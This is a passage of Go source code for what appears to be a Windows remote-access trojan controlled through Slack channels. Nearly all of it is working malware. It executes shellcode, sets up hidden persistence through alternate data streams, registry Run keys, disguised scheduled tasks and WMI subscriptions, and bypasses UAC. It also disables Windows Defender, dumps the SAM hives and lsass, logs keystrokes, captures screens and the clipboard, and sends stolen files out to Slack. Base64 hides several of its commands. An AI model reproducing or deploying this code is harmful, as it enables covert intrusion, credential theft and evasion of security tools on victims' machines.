	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)

}

func cleanup(mode string) { // Remove persistence artifacts
	appdata, _ := os.LookupEnv("APPDATA")
	path := appdata + "\\Windows:svchost.exe"
	os.Remove(path)
	path = appdata + "\\Windows:winrm.vbs"
	os.Remove(path)

	if mode == "registry" {
		CLEAN, _ := os.Create("C:\\Users\\Public\\build.bat")
		// REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Network /f
		var HKCU string = "UkVHIERFTEVURSBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBOZXR3b3JrIC9m"
		DecodedHKCU, _ := base64.StdEncoding.DecodeString(HKCU)
		CLEAN.WriteString(string(DecodedHKCU))
		Exec := exec.Command("cmd", "/c", string(DecodedHKCU))
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Run()
		if checkForAdmin() {
			// REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Network /f
			var HKLM string = "UkVHIERFTEVURSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBOZXR3b3JrIC9m"
			DecodedHKLM, _ := base64.StdEncoding.DecodeString(HKLM)
			Exec2 := exec.Command("cmd", "/c", string(DecodedHKLM))
			Exec2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			Exec2.Run()
		}

	}
	if mode == "scheduler" {
		var task string = "c2NodGFza3MgL2RlbGV0ZSAvVE4gIk9uZURyaXZlIFN0YW5kYWxvbmUgVXBkYXRlIFRhc2siIC9m"
		Decodedtask, _ := base64.StdEncoding.DecodeString(task)
		//Creates a bat file
		TASK, _ := os.Create("C:\\Users\\Public\\build.bat")
		TASK.WriteString(string(Decodedtask) + "\r\n")
		TASK.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Run()
		deleteFile("C:\\Users\\Public\\build.bat")
	}
	if mode == "exclusion" {
		if checkForAdmin() {
			cmdName := "powershell.exe"
			cmdE := exec.Command(cmdName)
			cmdEArgs := []string{"Remove-MpPreference -ExclusionPath C:\\"}
			cmdE = exec.Command(cmdName, cmdEArgs...)
			cmdE.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmdE.Run()
		}
	}
	if mode == "realtime" {
		cmdName := "powershell.exe"
		cmdRT := exec.Command(cmdName)
		cmdArgs := []string{"Set-MpPreference -DisableRealtimeMonitoring $false"}
		cmdRT = exec.Command(cmdName, cmdArgs...)
		cmdRT.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmdRT.Run()
	}
	if mode == "wmi" {
		if checkForAdmin() {
			cmdName := "powershell.exe"
			cmd := exec.Command(cmdName)
			cmdArgs := []string{"Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter \"Name='Windows Update Event'\" | Remove-WmiObject"}
			cmd = exec.Command(cmdName, cmdArgs...)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Run()
			cmdArgs = []string{"Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter \"Name='Windows Update Consumer'\" | Remove-WmiObject"}
			cmd = exec.Command(cmdName, cmdArgs...)
			cmd.Run()
			cmd = exec.Command(cmdName, cmdArgs...)
			cmdArgs = []string{"Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter \"__Path LIKE '%Windows Update%'\" | Remove-WmiObject"}
			cmd.Run()
		}
	}
	if mode == "signatures" {
		cmdName := "cmd.exe"
		cmdS := exec.Command(cmdName)
		cmdArgs := []string{"\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\"  -SignatureUpdate Set-MpPreference -DisableIOAVProtection $false"}
		cmdS = exec.Command(cmdName, cmdArgs...)
		cmdS.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmdS.Run()

	}

}

func persistence(mode string) { // persistence - This noisy.... Could be improved.

	//Creates a bat file
	PERSIST, _ := os.Create("C:\\Users\\Public\\build.bat")
	//Creates a "Windows" folder in %APPDATA%
	PERSIST.WriteString("mkdir %APPDATA%\\Windows" + "\r\n")
	//Copies this binary into an alternate data stream
	wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c %APPDATA%\\Windows:svchost.exe\", 0, False"
	PERSIST.WriteString("echo " + wscript + " > %APPDATA%\\Windows:winrm.vbs \r\n")
	PERSIST.WriteString("type " + os.Args[0] + "> %APPDATA%\\Windows:svchost.exe \r\n")

	if mode == "registry" {
		//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Network /t REG_SZ /F /D "wscript %APPDATA%\Windows:winrm.vbs"
		var RegAdd = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBOZXR3b3JrIC90IFJFR19TWiAvRiAvRCAid3NjcmlwdCAlQVBQREFUQSVcV2luZG93czp3aW5ybS52YnMi"
		if checkForAdmin() { //If user is admin, store in HKLM instead
			//REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Network /t REG_SZ /F /D "wscript %APPDATA%\Windows:winrm.vbs"
			RegAdd = "UkVHIEFERCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBOZXR3b3JrIC90IFJFR19TWiAvRiAvRCAid3NjcmlwdCAlQVBQREFUQSVcV2luZG93czp3aW5ybS52YnMi"
		}
		DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)
		//Add a registry key to execute the alternate datastream
		PERSIST.WriteString(string(DecodedRegAdd))
		PERSIST.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Run()
		deleteFile("C:\\Users\\Public\\build.bat")
	}
	if mode == "scheduler" {
		//schtasks /create /tn "OneDrive Standalone Update Task" /tr "wscript %APPDATA%\Windows:winrm.vbs" /sc DAILY
		var TaskAdd = "c2NodGFza3MgL2NyZWF0ZSAvdG4gIk9uZURyaXZlIFN0YW5kYWxvbmUgVXBkYXRlIFRhc2siIC90ciAid3NjcmlwdCAlQVBQREFUQSVcV2luZG93czp3aW5ybS52YnMiIC9zYyBEQUlMWQ=="
		if checkForAdmin() {
			// schtasks /create /tn "OneDrive Standalone Update Task" /tr "wscript %APPDATA%\Windows:winrm.vbs" /sc ONSTART /ru system
			TaskAdd = "c2NodGFza3MgL2NyZWF0ZSAvdG4gIk9uZURyaXZlIFN0YW5kYWxvbmUgVXBkYXRlIFRhc2siIC90ciAid3NjcmlwdCAlQVBQREFUQSVcV2luZG93czp3aW5ybS52YnMiIC9zYyBPTlNUQVJUIC9ydSBzeXN0ZW0="
		}
		DecodedTaskAdd, _ := base64.StdEncoding.DecodeString(TaskAdd)
		PERSIST.WriteString(string(DecodedTaskAdd))
		PERSIST.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Run()
		deleteFile("C:\\Users\\Public\\build.bat")
	}

	if mode == "wmi" {
		//MOF file
		var MOF = "I1BSQUdNQSBOQU1FU1BBQ0UgKCJcXFxcLlxccm9vdFxcc3Vic2NyaXB0aW9uIikKCmluc3RhbmNlIG9mIF9fRXZlbnRGaWx0ZXIgYXMgJEV2ZW50RmlsdGVyCnsKICAgTmFtZSA9ICJXaW5kb3dzIFVwZGF0ZSBFdmVudCI7CiAgIEV2ZW50TmFtZXNwYWNlID0gInJvb3RcXGNpbXYyIjsKICAgUXVlcnkgPSAiU0VMRUNUICogRlJPTSBfX0luc3RhbmNlTW9kaWZpY2F0aW9uRXZlbnQgV0lUSElOIDYwIFdIRVJFIFRhcmdldEluc3RhbmNlIElTQSAnV2luMzJfUGVyZkZvcm1hdHRlZERhdGFfUGVyZk9TX1N5c3RlbScgQU5EIFRhcmdldEluc3RhbmNlLlN5c3RlbVVwVGltZSA+PSAyMzAgQU5EIFRhcmdldEluc3RhbmNlLlN5c3RlbVVwVGltZSA8IDMzMCI7CiAgIFF1ZXJ5TGFuZ3VhZ2UgPSAiV1FMIjsKfTsKCmluc3RhbmNlIG9mIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciBhcyAkQ29uc3VtZXIKeyAgIAogICBOYW1lID0gIldpbmRvd3MgVXBkYXRlIENvbnN1bWVyIjsgICAKICAgUnVuSW50ZXJhY3RpdmVseSA9IGZhbHNlOyAgIAogICBDb21tYW5kTGluZVRlbXBsYXRlID0gIlBBVEgiOwp9OwoKaW5zdGFuY2Ugb2YgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZwp7CiAgIEZpbHRlciA9ICRFdmVudEZpbHRlcjsKICAgQ29uc3VtZXIgPSAkQ29uc3VtZXI7Cn07"
		DecodedMOF, _ := base64.StdEncoding.DecodeString(MOF)
		MOFile, _ := os.Create("C:\\Users\\Public\\DtcInstall.txt")
		env := os.Getenv("APPDATA") // Get APPDATA path
		env = strings.Replace(env, "\\", "\\\\", -1)
		MOFile.WriteString(strings.Replace(string(DecodedMOF), "PATH", "wscript "+env+"\\\\Windows:winrm.vbs", -1))
		MOFile.Close()
		PERSIST.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Run()
		deleteFile("C:\\Users\\Public\\build.bat")
		Exec2 := exec.Command("cmd", "/C", "mofcomp C:\\Users\\Public\\DtcInstall.txt")
		Exec2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec2.Run()
		deleteFile("C:\\Users\\Public\\DtcInstall.txt")
	}
}

func bypassUAC(mode string) {
	//Byapsses UAC using fodhelper.exe technique.
	if mode == "fodhelper" {
		//REG ADD HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\command /V DelegateExecute /t REG_SZ /F
		var DelegateExecute string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXENsYXNzZXNcbXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kIC9WIERlbGVnYXRlRXhlY3V0ZSAvdCBSRUdfU1ogL0Y="
		DecodedDelegateExecute, _ := base64.StdEncoding.DecodeString(DelegateExecute)
		//REG ADD HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\command  /t REG_SZ /F  /D "wscript %APPDATA%\build.vbs"
		var wscriptkey string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXENsYXNzZXNcbXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kICAvdCBSRUdfU1ogL0YgIC9EICJ3c2NyaXB0ICVBUFBEQVRBJVxidWlsZC52YnMi"
		Decodedwscript, _ := base64.StdEncoding.DecodeString(wscriptkey)
		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + "\", 0, False"
		//Creates a bat file
		UAC, _ := os.Create("C:\\Users\\Public\\build.bat")
		UAC.WriteString("mkdir %APPDATA%\\Windows" + "\r\n")
		UAC.WriteString(string(DecodedDelegateExecute) + "\r\n")
		UAC.WriteString(string(Decodedwscript) + "\r\n")
		UAC.WriteString("echo " + wscript + " > %APPDATA%\\build.vbs \r\n")
		UAC.WriteString("timeout 2 \r\n")
		UAC.WriteString("C:\\Windows\\System32\\fodhelper.exe \r\n")
		UAC.WriteString("REG DELETE HKCU\\SOFTWARE\\Classes\\ms-settings\\ /f \r\n")
		UAC.WriteString("timeout 2 \r\n")
		UAC.WriteString("del %APPDATA%\\build.vbs \r\n")
		UAC.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Run()
		deleteFile("C:\\Users\\Public\\build.bat")
	}
	if mode == "ask" {
		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + "\", 0, False"
		UAC, _ := os.Create("C:\\Users\\Public\\build.bat")
		UAC.WriteString("echo " + wscript + " > C:\\Users\\Public\\build.vbs \r\n")
		UAC.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Run()
		cmdName := "powershell.exe"
		cmdE := exec.Command(cmdName)
		cmdEArgs := []string{"Start-Process", "'cmd'", "'/c", "wscript C:\\Users\\Public\\build.vbs", "' -Verb runAs"}
		fmt.Println(cmdEArgs)
		cmdE = exec.Command(cmdName, cmdEArgs...)
		cmdE.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmdE.Run()
		time.Sleep(5 * time.Second)
		deleteFile("C:\\Users\\Public\\build.bat")
		deleteFile("C:\\Users\\Public\\build.vbs")

	}

}

func defanger(client_id, job_id, mode string) { //Stops real-time monitoring or adds a C:\ exclusion or deletes signatures

	if checkForAdmin() {
		if mode == "realtime" {
			cmdName := "powershell.exe"
			cmdRT := exec.Command(cmdName)
			cmdArgs := []string{"Set-MpPreference -DisableRealtimeMonitoring $true"}
			cmdRT = exec.Command(cmdName, cmdArgs...)
			cmdRT.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmdRT.Run()
		}
		if mode == "exclusion" {
			cmdName := "powershell.exe"
			cmdE := exec.Command(cmdName)
			cmdEArgs := []string{"Add-MpPreference -ExclusionPath C:\\"}
			cmdE = exec.Command(cmdName, cmdEArgs...)
			cmdE.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmdE.Run()
		}

		if mode == "signatures" {
			cmdName := "cmd.exe"
			cmdS := exec.Command(cmdName)
			cmdArgs := []string{"\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true"}
			cmdS = exec.Command(cmdName, cmdArgs...)
			cmdS.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmdS.Run()

		}
	} else {
		message := "Agent is not running as high integrity"
		encryptedOutput, _ := Encrypt([]byte(message))
		SendResult(client_id, job_id, "output", encryptedOutput)
	}

}

func duplicate() { //Spawns a new agent using forfiles.exe

	fmt.Println(os.Args[0])
	cmdName := "forfiles.exe"
	cmd := exec.Command(cmdName)
	cmdArgs := []string{"/p", "c:\\windows\\system32", "/m", "svchost.exe", "/c", os.Args[0]}
	cmd = exec.Command(cmdName, cmdArgs...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func getsystem() { //Uses Task scheduler to execute the binary as SYSTEM
	taskname := RandomString(6)
	task1 := "schtasks /create /TN " + taskname + " /TR \"forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + " \" /SC DAILY /RU system /F"
	task2 := "schtasks /run /I /tn " + taskname
	task3 := "schtasks /delete /TN " + taskname + " /f"
	//Creates a bat file
	GS, _ := os.Create("C:\\Users\\Public\\build.bat")
	GS.WriteString(string(task1) + "\r\n")
	GS.WriteString(string(task2) + "\r\n")
	GS.WriteString(string(task3) + "\r\n")
	GS.Close()
	Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Exec.Run()
	deleteFile("C:\\Users\\Public\\build.bat")
}

func TakeScreenShot(clientID, jobID string) {
	n := screenshot.NumActiveDisplays()
	rand.Seed(time.Now().UTC().UnixNano())
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, _ := screenshot.CaptureRect(bounds)
		screen, _ := os.Create(clientID + "_" + strconv.Itoa(i) + "_" + string(time.Now().Format("20060102150405")) + ".png")
		png.Encode(screen, img)
		screen.Close()
		upload_file(clientID, RandomString(5), screen.Name())
		os.Remove(string(screen.Name()))
	}
}

func upload_file(client_id, job_id, filein string) { // Uploads a file to Slack and returns the file URL
	splitter := strings.Split(filein, "\\")
	filename := splitter[len(splitter)-1]
	filepath := strings.Trim(filein, "\"")
	file, _ := ioutil.ReadFile(filepath)
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", filename)
	encyptedFile, _ := EncryptFile(file) //Encrypts the file before uploading to Slack
	eFile := bytes.NewReader(encyptedFile)
	io.Copy(part, eFile)
	writer.Close()
	resp, _ := http.NewRequest("POST", "https://slack.com/api/files.upload", body)
	resp.Header.Add("Content-Type", writer.FormDataContentType())
	resp.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	resp.Header.Add("Authorization", "Bearer "+token)
	client := &http.Client{}
	r, netError := client.Do(resp)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
	}
	bodyText, _ := ioutil.ReadAll(r.Body)
	s := string(bodyText)
	type Auto struct {
		Ok   bool `json:"ok"`
		File struct {
			ID                 string `json:"id"`
			Created            int    `json:"created"`
			Timestamp          int    `json:"timestamp"`
			Name               string `json:"name"`
			Title              string `json:"title"`
			Mimetype           string `json:"mimetype"`
			Filetype           string `json:"filetype"`
			PrettyType         string `json:"pretty_type"`
			User               string `json:"user"`
			Editable           bool   `json:"editable"`
			Size               int    `json:"size"`
			Mode               string `json:"mode"`
			IsExternal         bool   `json:"is_external"`
			ExternalType       string `json:"external_type"`
			IsPublic           bool   `json:"is_public"`
			PublicURLShared    bool   `json:"public_url_shared"`
			DisplayAsBot       bool   `json:"display_as_bot"`
			Username           string `json:"username"`
			URLPrivate         string `json:"url_private"`
			URLPrivateDownload string `json:"url_private_download"`
			Permalink          string `json:"permalink"`
			PermalinkPublic    string `json:"permalink_public"`
			EditLink           string `json:"edit_link"`
			Preview            string `json:"preview"`
			PreviewHighlight   string `json:"preview_highlight"`
			Lines              int    `json:"lines"`
			LinesMore          int    `json:"lines_more"`
			PreviewIsTruncated bool   `json:"preview_is_truncated"`
			CommentsCount      int    `json:"comments_count"`
			IsStarred          bool   `json:"is_starred"`
			Shares             struct {
			} `json:"shares"`
			Channels []interface{} `json:"channels"`
			Groups   []interface{} `json:"groups"`
			Ims      []interface{} `json:"ims"`
		} `json:"file"`
	}
	var m Auto
	json.Unmarshal([]byte(s), &m)
	fmt.Println(m.File.URLPrivateDownload)
	SendResult(client_id, job_id, "download", base64.StdEncoding.EncodeToString([]byte(m.File.URLPrivateDownload)))
}

func DownloadFile(url string) { //This pulls a file from a URL and writes it to disk
	filename := strings.Split(url, "/")
	filename = strings.Split(filename[len(filename)-1], "?")
	out, err := os.Create(filename[0])
	if err != nil {
	}
	defer out.Close()
	// Get the data
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	if strings.Contains(url, "slack.com") {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	res, netError := client.Do(req)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
	}
	if err != nil {
		log.Fatal(err)
	}
	// Write the body to file
	_, err = io.Copy(out, res.Body)
}

func Register(client_ID string) { // Send a message to the registration channel with the client ID and OS info
	client := &http.Client{Timeout: time.Second * 10}
	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	URL := "https://slack.com/api/chat.postMessage"
	v := url.Values{}
	v.Set("channel", registration)
	user := whoami()
	if checkForAdmin() {
		user = whoami() + "*"
	} else {
		user = whoami()
	}
	info := client_ID + ":" + name + ":" + user + ":" + GetLANOutboundIP() + ":" + string(getVersion())
	v.Set("text", info)
	//pass the values to the request's body
	req, err := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
	req.Header.Add("Authorization", "Bearer "+bearer)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	_, netError := client.Do(req)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
	}
}

func samdump(clientID, jobID string) {
	cmdName := "cmd.exe"
	cmdArgs := []string{"/c", "reg.exe save HKLM\\SAM sam_" + clientID}
	cmd := exec.Command(cmdName, cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
	cmd2Args := []string{"/c", "reg.exe save HKLM\\SYSTEM sys_" + clientID}
	cmd2 := exec.Command(cmdName, cmd2Args...)
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd2.Run()
	cmd3Args := []string{"/c", "reg.exe save HKLM\\SECURITY security_" + clientID}
	cmd3 := exec.Command(cmdName, cmd3Args...)
	cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd3.Run()
	rand.Seed(time.Now().UTC().UnixNano())
	jobID2 := RandomString(5)
	jobID3 := RandomString(5)
	upload_file(clientID, jobID, "sam_"+clientID)
	upload_file(clientID, jobID2, "sys_"+clientID)
	upload_file(clientID, jobID3, "security_"+clientID)
	deleteFile("sam_" + clientID)
	deleteFile("sys_" + clientID)
	deleteFile("security_" + clientID)

}

func CheckCommands(t, client_ID string) { //This is the main thing, reads the commands channel and acts accordingly
	client := &http.Client{}
	URL := "https://slack.com/api/channels.history"
	v := url.Values{}
	v.Set("channel", commands)
	v.Set("token", token)
	v.Set("oldest", t)
	//pass the values to the request's body
	req, _ := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
	req.Header.Add("Authorization", "Bearer "+bearer)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, netError := client.Do(req)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
		return
	}
	bodyText, _ := ioutil.ReadAll(resp.Body)
	s := string(bodyText)
	fmt.Println(s) //Just for debugging

	type Auto struct { //This structure is for parsing the JSON
		Ok       bool   `json:"ok"`
		Error    string `json:"error"`
		Messages []struct {
			Type        string `json:"type"`
			User        string `json:"user,omitempty"`
			Text        string `json:"text"`
			ClientMsgID string `json:"client_msg_id,omitempty"`
			Ts          string `json:"ts"`
			Username    string `json:"username,omitempty"`
			BotID       string `json:"bot_id,omitempty"`
			Subtype     string `json:"subtype,omitempty"`
		} `json:"messages"`
		HasMore bool `json:"has_more"`
	}
	var m Auto
	json.Unmarshal([]byte(s), &m)
	//If the error string exists, you are probably rate limited.  Sleep it off.
	if m.Error != "" {
		fmt.Println("Rate Limited, Sleeping for a bit...")
		time.Sleep(time.Duration(randomFloat(1, 30, 1)[0]) * time.Second)
	}
	//This loops through each message
	for _, Message := range m.Messages {
		//this splits the different parts of the message
		stringSlice := strings.Split(Message.Text, ":")
		clientID := stringSlice[0]
		jobID := stringSlice[1]
		cmd_type := stringSlice[2]
		command := stringSlice[3]
		//If the client_ID is for me (or all agents)
		if clientID == client_ID || clientID == "31337" {
			//And this job has not yet been processed
			if !stringInSlice(jobID, processed_ids) {
				// append processed ID to the list of processed jobs
				processed_ids = append(processed_ids, jobID)
				fmt.Println(processed_ids)
				/// Run stuff based on type
				switch cmd_type {

				case "command":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					go RunCommand(client_ID, jobID, string(data))

				case "kill":
					os.Exit(3)

				case "sleep":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					sleeptime, _ := strconv.Atoi(string(data))
					time.Sleep(time.Duration(sleeptime) * time.Second)

				case "upload":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					DownloadFile(string(data))

				case "minidump":
					go miniDump("C:\\Users\\Public\\", "lsass.exe", clientID, jobID)

				case "samdump":
					go samdump(clientID, jobID)

				case "screenshot":
					go TakeScreenShot(clientID, jobID)

				case "beacon":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					beacon, _ = strconv.Atoi(string(data))

				case "download":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					upload_file(clientID, jobID, string(data))

				case "persist":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					go persistence(string(data))

				case "clean":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					go cleanup(string(data))

				case "sysinfo":
					sysinfo := SysInfo()
					encryptedOutput, _ := Encrypt([]byte(sysinfo))
					SendResult(clientID, jobID, "output", encryptedOutput)

				case "revive":
					Register(client_ID)

				case "keyscan":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					keyscan(clientID, jobID, string(data))

				case "clipboard":
					clippy, _ := clipboard.ReadAll()
					encryptedOutput, _ := Encrypt([]byte(clippy))
					SendResult(clientID, jobID, "output", encryptedOutput)

				case "metasploit":
					if runtime.GOARCH != "386" {
						data, err := Decrypt(command)
						if err != nil {
							log.Fatal("error:", err)
						}
						fmt.Printf("%q\n", data)
						go shellcode(string(data), true)
					} else {
						not32 := "This agent is 32 bit.  This module will not work."
						encryptedOutput, _ := Encrypt([]byte(not32))
						SendResult(clientID, jobID, "output", encryptedOutput)
					}
				case "shellcode": // Execute shellcode from a URL
					if runtime.GOARCH != "386" {
						data, err := Decrypt(command)
						if err != nil {
							log.Fatal("error:", err)
						}
						fmt.Printf("%q\n", data)
						go shellcode(string(data), false)
					} else {
						not32 := "This agent is 32 bit.  This module will not work."
						encryptedOutput, _ := Encrypt([]byte(not32))
						SendResult(clientID, jobID, "output", encryptedOutput)
					}

				case "duplicate":
					go duplicate()

				case "elevate":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					go bypassUAC(string(data))

				case "defanger":
					data, err := Decrypt(command)
					if err != nil {
						log.Fatal("error:", err)
					}
					fmt.Printf("%q\n", data)
					go defanger(clientID, jobID, string(data))

				case "getsystem":
					go getsystem()
				}

			}
		}
	}
	return
}

func RunCommand(client_id, job_id, command string) { //This receives a command to run and runs it
	cmdName := "cmd.exe"
	cmd := exec.Command(cmdName)
	//Check if the command has multiple params
	if strings.ContainsAny(command, " ") {
		args := strings.SplitN(command, " ", 2)
		switch args[0] {
		// OPSEC - Perform alternate actions to avoid calling cmd.exe
		case "cd":
			os.Chdir(args[1])
			mydir, err := os.Getwd()
			if err == nil {
				fmt.Println(mydir)
				encryptedOutput, _ := Encrypt([]byte(mydir))
				SendResult(client_id, job_id, "output", encryptedOutput)
			}
		case "ls":
			ls := ls(args[1])
			encryptedOutput, _ := Encrypt([]byte(ls))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "find":
			find := find(args[1])
			encryptedOutput, _ := Encrypt([]byte(find))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "rm":
			rm := deleteFile(args[1])
			encryptedOutput, _ := Encrypt([]byte(rm))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "mkdir":
			mkdir := makeDir(args[1])
			encryptedOutput, _ := Encrypt([]byte(mkdir))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "rmdir":
			rmdir := deleteDir(args[1])
			encryptedOutput, _ := Encrypt([]byte(rmdir))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "cat":
			content := cat(args[1])
			encryptedOutput, _ := Encrypt([]byte(content))
			SendResult(client_id, job_id, "output", encryptedOutput)

		default:
			cmdArgs := []string{"/c", args[0], args[1]}
			cmd = exec.Command(cmdName, cmdArgs...)
			fmt.Println("Running command: " + command)
			var out bytes.Buffer
			var stderr bytes.Buffer
			cmd.Stdout = &out
			cmd.Stderr = &stderr
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err := cmd.Run()
			if err != nil {
				encryptedOutput, _ := Encrypt([]byte(stderr.String()))
				SendResult(client_id, job_id, "output", encryptedOutput)
			} else {
				encryptedOutput, _ := Encrypt([]byte(out.String()))
				SendResult(client_id, job_id, "output", encryptedOutput)
			}
		}
	} else {
		//OPSEC - Perform alternate actions to avoid calling cmd.exe
		switch command {
		case "pwd":
			mydir, err := os.Getwd()
			if err == nil {
				encryptedOutput, _ := Encrypt([]byte(mydir))
				SendResult(client_id, job_id, "output", encryptedOutput)
			}

		case "cd":
			mydir, err := os.Getwd()
			if err == nil {
				encryptedOutput, _ := Encrypt([]byte(mydir))
				SendResult(client_id, job_id, "output", encryptedOutput)
			}

		case "ls":
			ls := ls("./")
			encryptedOutput, _ := Encrypt([]byte(ls))
			SendResult(client_id, job_id, "output", encryptedOutput)

		case "ifconfig":
			ifconfig := ifconfig()
